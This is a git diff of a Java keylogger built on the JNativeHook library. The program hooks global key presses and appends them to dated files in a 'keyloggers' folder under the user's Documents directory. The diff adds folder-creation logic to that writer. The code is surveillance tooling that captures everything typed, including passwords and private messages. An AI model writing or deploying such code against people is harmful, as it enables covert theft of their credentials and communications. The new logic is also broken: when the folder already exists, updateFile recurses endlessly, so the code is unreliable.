@@ -1,3 +1,5 @@
+package org.example;
+
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
@@ -22,6 +24,7 @@ public class Main implements NativeKeyListener {
 
     DateTimeFormatter formatTime = DateTimeFormatter.ofPattern("HH:mm:ss");
     private int keyCode;
+    private boolean folderCreated = false;
 
     public void nativeKeyPressed(NativeKeyEvent e) {
         // aSystem.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
@@ -96,26 +99,38 @@ public class Main implements NativeKeyListener {
     }
 
     public void updateFile(String key){
-        Path path = Paths.get(System.getProperty("user.home"),
-                "Documents",
-                "keyloggers",
-                LocalDate.now() + ".txt"
-                );
-        String strPath = String.valueOf(path);
-        File flNew = new File(strPath);
-        try{
-            // Confirmar existencia, de no existir, se crea y agrega el nuevo dato
-            /*
-            * Dos opciones:
-            * 1. El archivo se creó recién, entonces aceptamos y actualizamos linea.
-            * 2. El archivo ya está creado, por lo que daría error (?)
-            * */
-            flNew.createNewFile();
-            updateDoc(key, flNew.getPath());
-        }catch(IOException errIO){
-            System.out.println("A error ocurred.");
-            errIO.printStackTrace();
+        if(folderCreated){
+            Path path = Paths.get(System.getProperty("user.home"),
+                    "Documents",
+                    "keyloggers",
+                    LocalDate.now() + ".txt"
+            );
+            String strPath = String.valueOf(path);
+            File flNew = new File(strPath);
+            try{
+                // Confirmar existencia, de no existir, se crea y agrega el nuevo dato
+                /*
+                 * Dos opciones:
+                 * 1. El archivo se creó recién, entonces aceptamos y actualizamos linea.
+                 * 2. El archivo ya está creado, por lo que daría error (?)
+                 * */
+                flNew.createNewFile();
+                updateDoc(key, flNew.getPath());
+            }catch(IOException errIO){
+                System.out.println("A error ocurred.");
+                errIO.printStackTrace();
+            }
+        }else{
+            // Creamos el folder
+            Path folderPath = Paths.get(System.getProperty("user.home"),
+                    "Documents",
+                    "keyloggers");
+            File directory = new File(String.valueOf(folderPath));
+            boolean created = directory.mkdir();
+            if(created) folderCreated = created;
+            updateFile(key);
         }
+
     }
 
     public static void main(String[] args) {
